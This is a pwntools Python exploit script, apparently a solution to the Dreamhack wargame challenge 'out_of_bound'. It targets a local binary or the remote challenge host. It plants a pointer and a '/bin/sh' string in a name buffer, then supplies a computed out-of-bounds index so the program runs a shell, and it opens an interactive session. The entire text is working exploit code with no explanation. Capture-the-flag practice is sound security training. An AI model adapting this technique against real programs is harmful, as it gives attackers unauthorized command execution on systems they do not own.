#!/usr/bin/env python3

from pwn import *

exe = ELF("./out_of_bound")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 13605)

    return r


def main():
    r = conn()

    payload = p32(exe.symbols["name"] + 4) + b"/bin/sh\x00"
    index = (exe.symbols["name"] - exe.symbols["command"]) // 4

    r.sendafter(b"Admin name: ", payload)
    r.sendlineafter(b"What do you want?: ", str(index).encode())

    r.interactive()


if __name__ == "__main__":
    main()
